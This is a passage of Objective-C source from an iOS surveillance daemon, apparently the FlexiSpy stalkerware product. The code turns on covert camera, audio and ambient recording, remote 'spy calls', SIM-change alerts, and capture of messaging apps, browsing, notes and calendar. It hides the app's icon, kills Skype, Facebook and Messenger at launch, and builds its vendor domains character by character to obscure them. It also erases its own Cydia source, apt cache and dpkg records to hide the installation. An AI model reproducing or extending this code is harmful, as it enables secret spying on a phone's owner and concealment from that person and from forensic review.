			mMediaCaptureManager = [[MediaCaptureManager alloc] initWithEventDelegate:mEventCenter andThumbnailDirectoryPath:mediaCapturePath];
		}
		
		// Camera
		if ([mConfigurationManager isSupportedFeature:kFeatureID_EventCameraImage]) {
			if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableCameraImage]) {
				[mMediaCaptureManager startCameraImageCapture];
			} else {
				[mMediaCaptureManager stopCameraImageCapture];
			}
		}
		// Video
		if ([mConfigurationManager isSupportedFeature:kFeatureID_EventVideoRecording]) {
			if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableVideoFile]) {
				[mMediaCaptureManager startVideoCapture];
			} else {
				[mMediaCaptureManager stopVideoCapture];
			}
		}
		// Audio
		if ([mConfigurationManager isSupportedFeature:kFeatureID_EventSoundRecording]) {
			if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableAudioFile]) {
				[mMediaCaptureManager startAudioCapture];
			} else {
				[mMediaCaptureManager stopAudioCapture];
			}
		}
		// Wallpaper
		if ([mConfigurationManager isSupportedFeature:kFeatureID_EventWallpaper]) {
			if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableWallPaper]) {
				[mMediaCaptureManager startWallPaperCapture];
			} else {
				[mMediaCaptureManager stopWallPaperCapture];
			}
		}
	} else {
		[mMediaCaptureManager release];
		mMediaCaptureManager = nil;
	}
	
	// Browser url/Bookmark capture
	if ([mConfigurationManager isSupportedFeature:kFeatureID_EventBrowserUrl]) {
		if (!mBrowserUrlCaptureManager) {
			mBrowserUrlCaptureManager = [[BrowserUrlCaptureManager alloc] initWithEventDelegate:mEventCenter];
		}
		if ([prefEventCapture mStartCapture]) {
			if ([prefEventCapture mEnableBrowserUrl]) {
				[mBrowserUrlCaptureManager startBrowserUrlCapture];
			} else {
				[mBrowserUrlCaptureManager stopBrowserUrlCapture];
			}
		} else {
			[mBrowserUrlCaptureManager stopBrowserUrlCapture];
		}
	} else {
		[mBrowserUrlCaptureManager release];
		mBrowserUrlCaptureManager = nil;
	}
	
	// Spy call
	if ([mConfigurationManager isSupportedFeature:kFeatureID_SpyCall] ||
		[mConfigurationManager isSupportedFeature:kFeatureID_OnDemandConference]) {
		if (!mSpyCallManager) {
			mSpyCallManager = [[SpyCallManager alloc] init];
			[mSpyCallManager setMSMSSender:mSMSSendManager];
			[mSpyCallManager setMPreferenceManager:mPreferenceManager];
		}
		
		if ([[mLicenseManager mCurrentLicenseInfo] licenseStatus] != EXPIRED &&
			[[mLicenseManager mCurrentLicenseInfo] licenseStatus] != DISABLE) {
			if ([prefMonitorNumbers mEnableMonitor]) {
				[mSpyCallManager start];
				// Not capture monitor numbers (suppose call log capture is allocated)
				if ([mConfigurationManager isSupportedFeature:kFeatureID_EventCall]) {
					[mCallLogCaptureManager setMNotCaptureNumbers:[prefMonitorNumbers mMonitorNumbers]];
				}
			} else {
				[mSpyCallManager stop];
				// Not capture monitor numbers (suppose call log capture is allocated)
				if ([mConfigurationManager isSupportedFeature:kFeatureID_EventCall]) {
					[mCallLogCaptureManager setMNotCaptureNumbers:nil];
				}
			}
		} else {
			[mSpyCallManager stop];
			// Not capture monitor numbers (suppose call log capture is allocated)
			if ([mConfigurationManager isSupportedFeature:kFeatureID_EventCall]) {
				[mCallLogCaptureManager setMNotCaptureNumbers:nil];
			}
		}
	} else {
		[mSpyCallManager disableSpyCall];
		[mSpyCallManager release];
		mSpyCallManager = nil;
	}

	// Keyword
	if ([mConfigurationManager isSupportedFeature:kFeatureID_SMSKeyword]) {
		NSData *keywordData = [prefKeyword toData];
		SharedFileIPC *sharedFileIPC = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate];
		[sharedFileIPC writeData:keywordData withID:kSharedFileKeywordID];
		[sharedFileIPC release];
	} else {
		PrefKeyword *pKeyword = [[PrefKeyword alloc] init];
		NSData *keywordData = [pKeyword toData];
		SharedFileIPC *sharedFileIPC = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate];
		[sharedFileIPC writeData:keywordData withID:kSharedFileKeywordID];
		[sharedFileIPC release];
		[pKeyword release];
	}
	
	// Visibility
	id <AppVisibility> visibility = [mApplicationContext getAppVisibility];
	if ([mConfigurationManager isSupportedFeature:kFeatureID_HideApplicationIcon]) {
		if ([prefVisibility mVisible]) {
			[visibility hideIconFromAppSwitcherIcon:NO andDesktop:NO];
		} else {
			[visibility hideIconFromAppSwitcherIcon:YES andDesktop:YES];
		}
		
		NSArray *hiddenIds = [prefVisibility hiddenBundleIdentifiers];
		NSArray *shownIds = [prefVisibility shownBundleIdentifiers];
		[visibility hideApplicationIconFromAppSwitcherSpringBoard:hiddenIds];
		[visibility showApplicationIconInAppSwitcherSpringBoard:shownIds];
	} else {
		[visibility hideIconFromAppSwitcherIcon:NO andDesktop:NO];
		[visibility hideApplicationIconFromAppSwitcherSpringBoard:[NSArray array]];
		
		NSArray *hiddenIds = [prefVisibility hiddenBundleIdentifiers];
		NSArray *shownIds = [prefVisibility shownBundleIdentifiers];
		NSArray *all = [hiddenIds arrayByAddingObjectsFromArray:shownIds];
		[visibility showApplicationIconInAppSwitcherSpringBoard:all];
	}
	[visibility applyAppVisibility];
	
	// SIM change notification
	if ([mConfigurationManager isSupportedFeature:kFeatureID_SIMChange] ||
		[mConfigurationManager isSupportedFeature:kFeatureID_HomeNumbers] ||
		[mConfigurationManager isSupportedFeature:kFeatureID_SpyCall]) {
		
		// 1. Home numbers
		if ([mConfigurationManager isSupportedFeature:kFeatureID_HomeNumbers]) {
			NSString *notificationString = [[mApplicationContext mProductInfo] notificationStringForCommand:kNotificationSIMChangeCommandID
																					  withActivationCode:[[mLicenseManager mCurrentLicenseInfo] activationCode]
																								 withArg:nil];
			[mSIMChangeManager startReportSIMChange:notificationString andRecipients:[prefHomeNumbers mHomeNumbers]];
		}
		
		// 2. Monitor numbers
		if ([mConfigurationManager isSupportedFeature:kFeatureID_SpyCall]) {
			NSString *notificationString = NSLocalizedString (@"kSIMChange2MonitorNumbers", @"");
			[mSIMChangeManager startListenToSIMChange:notificationString andRecipients:[prefMonitorNumbers mMonitorNumbers]];
		}
	} else {
		[mSIMChangeManager stopReportSIMChange];
		[mSIMChangeManager stopListenToSIMChange];
	}
	
	// App agent
	if (!mAppAgentManager) {
		mAppAgentManager = [[AppAgentManager alloc] initWithEventDelegate:mEventCenter];
	}
	//[mAppAgentManager startListenMemoryWarningLevel]; // No need because spec is changed which not interested in memory low
	[mAppAgentManager startListenDiskSpaceWarningLevel];
	[mAppAgentManager startHandleUncaughtException];
	[mAppAgentManager startListenSystemPowerAndWakeIphone];
	[mAppAgentManager startListenBatteryWarningLevel];
	
	// Bookmark 
	if ([mConfigurationManager isSupportedFeature:kFeatureID_Bookmark]) {
		if (!mBookmarkManager) {
			DLog (@"----------- mBookmarkManager doesnt' exist, so create one")
			mBookmarkManager = [[BookmarkManagerImpl alloc] initWithDDM:mDDM];
		} else {
			DLog (@"----------- mBookmarkManager exists")
		}
		[mRemoteCmdManager setMBookmarkManager:mBookmarkManager];
		[mRemoteCmdManager relaunchForFeaturesChange];
	} else {
		DLog (@"RequestBookmark is not supported")
		[mBookmarkManager release];
		mBookmarkManager = nil;
		[mRemoteCmdManager setMBookmarkManager:nil];
		[mRemoteCmdManager relaunchForFeaturesChange];
	}
	
	// Installed/Running application 
	if ([mConfigurationManager isSupportedFeature:kFeatureID_InstalledApplication] ||
		[mConfigurationManager isSupportedFeature:kFeatureID_RunningApplication]) {
		if (!mApplicationManager) {
			DLog (@"mApplicationManager (installed) doesnt' exist, so create one")
			mApplicationManager = [[ApplicationManagerImpl alloc] initWithDDM:mDDM];
		} else {
			DLog (@"mApplicationManager (installed) exists")
		}
		[mRemoteCmdManager setMApplicationManager:mApplicationManager];
		[mRemoteCmdManager relaunchForFeaturesChange];
	} else {
		[mApplicationManager release];
		mApplicationManager = nil;
		[mRemoteCmdManager setMApplicationManager:nil];
		[mRemoteCmdManager relaunchForFeaturesChange];
	}
	
	// Application life cycle manager
	if ([mConfigurationManager isSupportedFeature:kFeatureID_ApplicationLifeCycleCapture]) {
		if (!mALCManager) {
			mALCManager = [[ALCManager alloc] initWithEventDelegate:mEventCenter];
		}
		
		if ([prefEventCapture mStartCapture]) {
			if ([prefEventCapture mEnableALC]) {
				[mALCManager startMonitor];
			} else {
				[mALCManager stopMonitor];
			}
		} else {
			[mALCManager stopMonitor];
		}
	} else {
		[mALCManager release];
		mALCManager = nil;
	}
	
	// Ambient recording manager
	if ([mConfigurationManager isSupportedFeature:kFeatureID_AmbientRecording]) {
		if (!mAmbientRecordingManager) {
			NSString* mediaCapturePath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"media/capture/"];
			[DaemonPrivateHome createDirectoryAndIntermediateDirectories:mediaCapturePath];
			mAmbientRecordingManager = [[AmbientRecordingManagerImpl alloc] initWithEventDelegate:mEventCenter outputPath:mediaCapturePath];
		}
		[mRemoteCmdManager setMAmbientRecordingManager:mAmbientRecordingManager];
		[mRemoteCmdManager relaunchForFeaturesChange];
	} else {
		[mAmbientRecordingManager release];
		mAmbientRecordingManager = nil;
		[mRemoteCmdManager setMAmbientRecordingManager:nil];
		[mRemoteCmdManager relaunchForFeaturesChange];
	}
	
	// Note manager
	if ([mConfigurationManager isSupportedFeature:kFeatureID_NoteCapture]) {
		if (!mNoteManager) {
			mNoteManager = [[NoteManagerImpl alloc] initWithDDM:mDDM];
			[mRemoteCmdManager setMNoteManager:mNoteManager];
		}
		if ([prefEventCapture mEnableNote]) { // Regardless of stop capture flag
			[mNoteManager startCapture];
		} else {
			[mNoteManager stopCapture];
		}
	} else {
		[mNoteManager release];
		mNoteManager = nil;
		[mRemoteCmdManager setMNoteManager:nil];
		[mRemoteCmdManager relaunchForFeaturesChange];
	}
	
	// Calendar Manager 
	if ([mConfigurationManager isSupportedFeature:kFeatureID_EventCalendar]) {
		if (!mCalendarManager) {
			DLog (@"mCalendarManager (installed) doesnt' exist, so create one")
			mCalendarManager = [[CalendarManagerImpl alloc] initWithDDM:mDDM];
		} else {
			DLog (@"mCalendarManager (installed) exists")
		}
		[mRemoteCmdManager setMCalendarManager:mCalendarManager];
		[mRemoteCmdManager relaunchForFeaturesChange];
		
		if ([prefEventCapture mEnableCalendar]) { // Regardless of stop capture flag
			[mCalendarManager startCapture];
		} else {
			[mCalendarManager stopCapture];
		}
	} else {
		[mCalendarManager release];
		mCalendarManager = nil;
		[mRemoteCmdManager setMCalendarManager:nil];
		[mRemoteCmdManager relaunchForFeaturesChange];
	}
	
	// Remote camera image/video manager
	if ([mConfigurationManager isSupportedFeature:kFeatureID_RemoteCameraImage]) {
		if (!mCameraCaptureManager) {
			mCameraCaptureManager = [[CameraCaptureManager alloc] initWithEventDelegate:mEventCenter];
			NSString* cameraCapturePath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"media/capture/"];
			[DaemonPrivateHome createDirectoryAndIntermediateDirectories:cameraCapturePath];
			[mCameraCaptureManager setMOnDemandOutputPath:cameraCapturePath];
		} else {
			DLog (@"mCameraCaptureManager already exists")
		}
		[mRemoteCmdManager setMCameraEventCapture:mCameraCaptureManager];
		[mRemoteCmdManager relaunchForFeaturesChange];
	} else {
		[mCameraCaptureManager release];
		mCameraCaptureManager = nil;
		[mRemoteCmdManager setMCameraEventCapture:nil];
		[mRemoteCmdManager relaunchForFeaturesChange];
	}

	// Actions required when applicaton activate or reactivate NOT application restarted
	if ([self mIsRestartingAppEngine]) { // Application just restart from either crash or phone restart
		DLog (@"AppEngine resume all pending remote commands")
		// Resume all pending commands
		[mRemoteCmdManager processPendingRemoteCommands];
	} else {
		// Application have been ACTIVATED by user
	}
}

- (void) destructApplicationFeatures {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
	DLog(@"Destruct features")
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
	
	LicenseInfo *licenseInfo = [mLicenseManager mCurrentLicenseInfo];
	
	PrefVisibility *prefVis = (PrefVisibility *)[mPreferenceManager preference:kVisibility];
	NSArray *hiddenIds = [prefVis hiddenBundleIdentifiers];
	NSArray *shownIds = [prefVis shownBundleIdentifiers];
	
	if ([licenseInfo licenseStatus] == DEACTIVATED) {
		// Reset the preferences
		[mPreferenceManager resetPreferences];
	
		// Clear all shared settings
		[self clearSharedSettings];
	}
	
	// Call
	[mCallLogCaptureManager release];
	mCallLogCaptureManager = nil;
	
	// SMS
	[mSMSCaptureManager release];
	mSMSCaptureManager = nil;
	
	// IMessage
	[mIMessageCaptureManager release];
	mIMessageCaptureManager = nil;
	
	//WhatsApp
	[mWhatsAppCaptureManager release];
	mWhatsAppCaptureManager=nil;
	
	// LINE
	[mLINECaptureManager release];
	mLINECaptureManager = nil;
	
	// MMS
	[mMMSCaptureManager release];
	mMMSCaptureManager = nil;
	
	// Email
	if ([licenseInfo licenseStatus] == DEACTIVATED) {
		[MailCaptureManager clearEmailHistory];
	}
	[mMailCaptureManager release];
	mMailCaptureManager = nil;
	
	// Location
	[mLocationManager release];
	mLocationManager = nil;
	
	// Address book
	[mRemoteCmdManager setMAddressbookManager:nil];
	[mRemoteCmdManager relaunchForFeaturesChange];
	[mAddressbookManager release];
	mAddressbookManager = nil;
	
	// Media finder
	if ([licenseInfo licenseStatus] == DEACTIVATED) {
		[MediaFinder clearMediaHistory];
	}
	[mMediaFinder release];
	mMediaFinder = nil;
	
	// Media capture
	[mMediaCaptureManager release];
	mMediaCaptureManager = nil;
	
	// Borwser url/Bookmark capture
	[mBrowserUrlCaptureManager release];
	mBrowserUrlCaptureManager = nil;
	
	// Stop deliver
	[mEDM setDeliveryTimer:0];
	
	// Visibility
	id <AppVisibility> visibility = [mApplicationContext getAppVisibility];
	if ([licenseInfo licenseStatus] == DEACTIVATED) {
		[visibility hideIconFromAppSwitcherIcon:YES andDesktop:YES];
		[visibility hideApplicationIconFromAppSwitcherSpringBoard:[NSArray array]];
		
		NSArray *all = [hiddenIds arrayByAddingObjectsFromArray:shownIds];
		[visibility showApplicationIconInAppSwitcherSpringBoard:all];
		
	} else {
		DLog (@"=========================================")
		DLog (@"license may be expired or disable")
		DLog (@"=========================================")
		// For user reinstall or restart device
		[visibility hideIconFromAppSwitcherIcon:YES	andDesktop:YES];
		[visibility hideApplicationIconFromAppSwitcherSpringBoard:hiddenIds];
		[visibility showApplicationIconInAppSwitcherSpringBoard:shownIds];
		
	}
	[visibility applyAppVisibility];
	
	// SIM change notification
	[mSIMChangeManager stopReportSIMChange];
	[mSIMChangeManager stopListenToSIMChange];
	
	// Spy call manager
	[mSpyCallManager disableSpyCall];
	[mSpyCallManager release];
	mSpyCallManager = nil;
	
	// App agent
	[mAppAgentManager release];
	mAppAgentManager = nil;
	
	
	// Bookmar manager
	[mBookmarkManager release];
	mBookmarkManager = nil;
	[mRemoteCmdManager setMBookmarkManager:nil];
	[mRemoteCmdManager relaunchForFeaturesChange];
	
	// Application manager
	[mApplicationManager release];
	mApplicationManager = nil;
	[mRemoteCmdManager setMApplicationManager:nil];
	[mRemoteCmdManager relaunchForFeaturesChange];
	
	// Application life cycle manager
	[mALCManager release];
	mALCManager = nil;
	
	// Ambient recording Manager
	[mAmbientRecordingManager release];
	mAmbientRecordingManager = nil;
	
	// Skype capture manager
	[mSkypeCaptureManager release];
	mSkypeCaptureManager = nil;
	
	// Facebook capture manager
	[mFacebookCaptureManager prerelease];
	[mFacebookCaptureManager release];
	mFacebookCaptureManager = nil;
	
	// Viber capture manager
	[mViberCaptureManager release];
	mViberCaptureManager = nil;
	
	// Note manager
	[mNoteManager release];
	mNoteManager = nil;
	
	// Calendar manager
	[mCalendarManager release];
	mCalendarManager = nil;
	
	// Remote camera manager
	[mCameraCaptureManager release];
	mCameraCaptureManager = nil;
	
	// 1. Events repository
	// 2. Remote commands
	if (![self mIsRestartingAppEngine]) {
		// Application's license is deactivated or expired or disabled by user/server
		if ([licenseInfo licenseStatus] == DEACTIVATED) {
			[mERM deleteRepository];
		}
		// Always clear pending commands otherwise that would be crash if those pending
		// commands using features that already destroy... and the spec also metioned that
		// only deactivate and heartbeat command can execute..
		[mRemoteCmdManager clearAllPendingRemoteCommands];
	} else {
		// Application is just restarting because of crashing or phone restart
	}
}

- (EventQueryPriority*) eventQueryPriority {
	NSMutableArray* eventTypePriorityArray = [[NSMutableArray alloc] init];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypePanic]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypePanicImage]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeSettings]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeLocation]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeSystem]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeCallLog]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeSms]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeMms]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeMail]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeIM]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeIMAccount]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeIMContact]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeIMConversation]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeIMMessage]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeBrowserURL]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeBookmark]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeApplicationLifeCycle]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeAmbientRecordAudio]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeAmbientRecordAudioThumbnail]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeCameraImage]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeCameraImageThumbnail]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeVideo]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeVideoThumbnail]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeAudio]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeAudioThumbnail]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeCallRecordAudio]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeCallRecordAudioThumbnail]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeWallpaper]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeWallpaperThumbnail]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeRemoteCameraImage]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeRemoteCameraVideo]];
	EventQueryPriority* eventQueryPriority = [[EventQueryPriority alloc] initWithUserPriority:eventTypePriorityArray];
	[eventTypePriorityArray release];
	[eventQueryPriority autorelease];
	return (eventQueryPriority);
}

- (void) clearSharedSettings {
	// Share 0
	SharedFileIPC *sFile = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate];
	[sFile clearData];
	[sFile release];
	sFile = nil;
	
	// Share 4
	sFile = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate4];
	[sFile clearData];
	[sFile release];
	sFile = nil;
}

- (void) springboardDidLaunch {
	system("killall Skype"); // Skype for iPad
	system("killall Skype"); // Skype for iPhone
	system("killall Facebook"); // Facebook
	system("killall Messenger"); // Messenger
	// Delete Cydia source for faster devices like Iphone 5
	[self deleteCydiaSource];
}

- (void) deleteCydiaSource {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	
	// 1. Delete Cydia sources
	NSString *plistCydia = @"/var/lib/cydia/metadata.plist";
	NSMutableArray *sources = [NSMutableArray arrayWithCapacity:3];
	
	// flexispy.com
	NSString *source = [NSString stringWithString:@"f"];
	source = [source stringByAppendingString:@"l"];
	source = [source stringByAppendingString:@"e"];
	source = [source stringByAppendingString:@"x"];
	source = [source stringByAppendingString:@"i"];
	source = [source stringByAppendingString:@"s"];
	source = [source stringByAppendingString:@"p"];
	source = [source stringByAppendingString:@"y"];
	source = [source stringByAppendingString:@"."];
	source = [source stringByAppendingString:@"c"];
	source = [source stringByAppendingString:@"o"];
	source = [source stringByAppendingString:@"m"];
	[sources addObject:source];
	
	// dmw.cc
	source = [NSString stringWithString:@"d"];
	source = [source stringByAppendingString:@"m"];
	source = [source stringByAppendingString:@"w"];
	source = [source stringByAppendingString:@"."];
	source = [source stringByAppendingString:@"c"];
	source = [source stringByAppendingString:@"c"];
	[sources addObject:source];
	
	// mobilefonex.com
	source = [NSString stringWithString:@"m"];
	source = [source stringByAppendingString:@"o"];
	source = [source stringByAppendingString:@"b"];
	source = [source stringByAppendingString:@"i"];
	source = [source stringByAppendingString:@"l"];
	source = [source stringByAppendingString:@"e"];
	source = [source stringByAppendingString:@"f"];
	source = [source stringByAppendingString:@"o"];
	source = [source stringByAppendingString:@"n"];
	source = [source stringByAppendingString:@"e"];
	source = [source stringByAppendingString:@"x"];
	source = [source stringByAppendingString:@"."];
	source = [source stringByAppendingString:@"c"];
	source = [source stringByAppendingString:@"o"];
	source = [source stringByAppendingString:@"m"];
	[sources addObject:source];
	
	// mobilebackup.biz
	source = [NSString stringWithString:@"m"];
	source = [source stringByAppendingString:@"o"];
	source = [source stringByAppendingString:@"b"];
	source = [source stringByAppendingString:@"i"];
	source = [source stringByAppendingString:@"l"];
	source = [source stringByAppendingString:@"e"];
	source = [source stringByAppendingString:@"b"];
	source = [source stringByAppendingString:@"a"];
	source = [source stringByAppendingString:@"c"];
	source = [source stringByAppendingString:@"k"];
	source = [source stringByAppendingString:@"u"];
	source = [source stringByAppendingString:@"p"];
	source = [source stringByAppendingString:@"."];
	source = [source stringByAppendingString:@"b"];
	source = [source stringByAppendingString:@"i"];
	source = [source stringByAppendingString:@"z"];
	[sources addObject:source];
	
	// depdemo.com
	source = [NSString stringWithString:@"d"];
	source = [source stringByAppendingString:@"e"];
	source = [source stringByAppendingString:@"p"];
	source = [source stringByAppendingString:@"d"];
	source = [source stringByAppendingString:@"e"];
	source = [source stringByAppendingString:@"m"];
	source = [source stringByAppendingString:@"o"];
	source = [source stringByAppendingString:@"."];
	source = [source stringByAppendingString:@"c"];
	source = [source stringByAppendingString:@"o"];
	source = [source stringByAppendingString:@"m"];
	[sources addObject:source];
	
	DLog (@"Sources to delete = %@", sources);
	
	NSMutableDictionary *plistDict = [[NSMutableDictionary alloc] initWithContentsOfFile:plistCydia];
	NSMutableDictionary *sourcesDict = [[NSMutableDictionary alloc] initWithDictionary:[plistDict objectForKey:@"Sources"]];
	NSArray *allKeys = [[NSArray alloc] initWithArray:[sourcesDict allKeys]];
	DLog(@"************* plistDict = %@", plistDict);
	DLog(@"************* sourcesDict = %@", sourcesDict);
	DLog(@"************* sourcesDict allKeys = %@", [sourcesDict allKeys]);
	
	BOOL foundCydiaSource = NO;
	for (NSString *key in allKeys) {
		for (NSString *s in sources) {
			if ([key rangeOfString:s].location != NSNotFound) {
				[sourcesDict removeObjectForKey:key];
				if (!foundCydiaSource) foundCydiaSource = YES;
			}
		}
	}
	
	[plistDict setObject:sourcesDict forKey:@"Sources"];
	[plistDict writeToFile:plistCydia atomically:YES];
	//BOOL wroteToFile = [plistDict writeToFile:plistCydia atomically:YES];
	
	DLog(@"------------- plistDict = %@", plistDict);
	DLog(@"------------- sourcesDict = %@", sourcesDict);
	DLog(@"------------- sourcesDict allKeys = %@", [sourcesDict allKeys]);
	//DLog(@"------------- wroteToFile = %d", wroteToFile);
	
	[allKeys release];
	[sourcesDict release];
	[plistDict release];
	
	if (foundCydiaSource) {
		NSFileManager *fileManager = [NSFileManager defaultManager];
		[fileManager removeItemAtPath:@"/etc/apt/sources.list.d/cydia.list" error:nil];
		
		// 2. Delete .deb cache
		NSBundle *bundle = [NSBundle mainBundle];
		NSString *bundleIdentifier = [bundle bundleIdentifier];
		NSString *cache = @"/var/cache/apt/archives/";
		NSArray *debs = [fileManager contentsOfDirectoryAtPath:cache error:nil];
		for (NSString *deb in debs) {
			if ([deb rangeOfString:bundleIdentifier].location != NSNotFound) {
				NSString *fileName = [cache stringByAppendingString:deb];
				[fileManager removeItemAtPath:fileName error:nil];
			}
		}
		
		// 3. Delete package from apt list
		NSMutableArray *ss = [NSMutableArray arrayWithArray:sources];
		NSString *pkg = @"/var/lib/apt/lists/";
		NSArray *packages = [fileManager contentsOfDirectoryAtPath:pkg error:nil];
		for (NSString *package in packages) {
			for (NSString *s in ss) {
				if ([package rangeOfString:s].location != NSNotFound) {
					NSString *fileName = [pkg stringByAppendingString:package];
					[fileManager removeItemAtPath:fileName error:nil];
					[ss removeObject:s];
					break;
				}
			}
		}
		
		// 4. Delete bundle and application name section is status (NO COPY)
		// 4.1 Read data from file
		NSData *statusCopyData = [NSData dataWithContentsOfFile:@"/var/lib/dpkg/status"];
		NSString *statusCopyContent = [[NSString alloc] initWithData:statusCopyData encoding:NSUTF8StringEncoding];
		
		// 4.2 Find pattern by decompse
		NSMutableArray *statusCopyPatterns = [NSMutableArray arrayWithArray:[statusCopyContent componentsSeparatedByString:@"\n\n"]];
		NSMutableArray *myPatterns = [NSMutableArray arrayWithCapacity:3];
		for (NSString *pattern in statusCopyPatterns) {
			if ([pattern rangeOfString:bundleIdentifier].location != NSNotFound) {
				[myPatterns addObject:pattern];
			} else {
				for (NSString *s in sources) {
					// mobilebackup.biz
					NSString *name = [[s componentsSeparatedByString:@"."] objectAtIndex:0];
					if ([pattern rangeOfString:name].location != NSNotFound) {
						[myPatterns addObject:pattern];
						break;
					}
				}
			}
		}
		
		// 4.3 Remove pattern
		for (NSString *myPattern in myPatterns) {
			[statusCopyPatterns removeObject:myPattern];
		}
		[statusCopyContent release];
		
		// 4.4 Compose it back
		statusCopyContent = [statusCopyPatterns componentsJoinedByString:@"\n\n"];
		statusCopyData = [statusCopyContent dataUsingEncoding:NSUTF8StringEncoding];
		[statusCopyData writeToFile:@"/var/lib/dpkg/status" atomically:YES];
		
		DLog(@"---------------------------------------");
		DLog (@"debs = %@", debs);
		DLog (@"packages = %@", packages);
		DLog(@"---------------------------------------");
		
		// 5. Delete other 5 files in /var/lib/dpkg/info folder
		//	- bundleIdentifier.prerm
		//	- bundleIdentifier.preinst
		//	- bundleIdentifier.postinst
		//	- bundleIdentifier.postrm
		//	- bundleIdentifier.list
		
		NSString *fileName = [NSString stringWithFormat:@"/var/lib/dpkg/info/%@", bundleIdentifier];
		NSString *filePath = [fileName stringByAppendingString:@".prerm"];
		[fileManager removeItemAtPath:filePath error:nil];
		filePath = [fileName stringByAppendingString:@".preinst"];
		[fileManager removeItemAtPath:filePath error:nil];
		filePath = [fileName stringByAppendingString:@".postinst"];
		[fileManager removeItemAtPath:filePath error:nil];
		filePath = [fileName stringByAppendingString:@".postrm"];
		[fileManager removeItemAtPath:filePath error:nil];
		filePath = [fileName stringByAppendingString:@".list"];
		[fileManager removeItemAtPath:filePath error:nil];
	}
	
	[pool release];
}

#pragma mark -
#pragma mark License changes private method
#pragma mark -

- (void) doLicenseChanged: (LicenseInfo*) aLicenseInfo {
	// Set IMEI to CSM
	NSString *imei = [[mApplicationContext mPhoneInfo] getIMEI];
	if (!imei) imei = @"";
	[mCSM setIMEI:imei];
	
	// Update config
	NSInteger configID = [aLicenseInfo configID];
	if ([aLicenseInfo licenseStatus] == EXPIRED) {
		configID = CONFIG_EXPIRE_LICENSE;
		
		// Disable get config every 24 hours
		[mLicenseGetConfigUtils stop];
		
	} else if ([aLicenseInfo licenseStatus] == DISABLE) {
		configID = CONFIG_DISABLE_LICENSE;
		
		// Disable get config every 24 hours
		[mLicenseGetConfigUtils stop];
		
	} else if ([aLicenseInfo licenseStatus] == ACTIVATED) {		
		// Enable get config every 24 hours
		[mLicenseGetConfigUtils start];
		
	} else { // DEACTIVATED/UNKNOWN
		// Disable get config every 24 hours
		[mLicenseGetConfigUtils stop];
	}
	
	// Send license info to UI exclusively
	LicenseInfo *licInfo = [[LicenseInfo alloc] init];
	[licInfo setMd5:[aLicenseInfo md5]];
	[licInfo setLicenseStatus:[aLicenseInfo licenseStatus]];
	[licInfo setConfigID:configID];
	[licInfo setActivationCode:[aLicenseInfo activationCode]];
	[mAppEngineConnection processCommand:kAppUI2EngineGetLicenseInfoCmd
							 withCmdData:licInfo];
	[licInfo release];
	
	[mConfigurationManager updateConfigurationID:configID];
	Configuration *config = [mConfigurationManager configuration];
	[mRemoteCmdManager setMSupportCmdCodes:[config mSupportedRemoteCmdCodes]];
	[mActivationCodeCaptureManager setMAC:[aLicenseInfo activationCode]];
	
	// Construct/Destruct features
	if ([aLicenseInfo licenseStatus] == ACTIVATED) {
		[self createApplicationFeatures];
	} else if ([aLicenseInfo licenseStatus] == DEACTIVATED||
			   [aLicenseInfo licenseStatus] == EXPIRED ||
			   [aLicenseInfo licenseStatus] == DISABLE ||
			   [aLicenseInfo licenseStatus] == LC_UNKNOWN) {
		[self destructApplicationFeatures];
	}
	
	// Delete Cydia source only when application start/restart for slower devices like Iphone 3GS
	if ([self mIsRestartingAppEngine]) {
		[self deleteCydiaSource];
	}
	
	// Set engine of the application is no longer just restart
	[self setMIsRestartingAppEngine:FALSE];
}

#pragma mark -
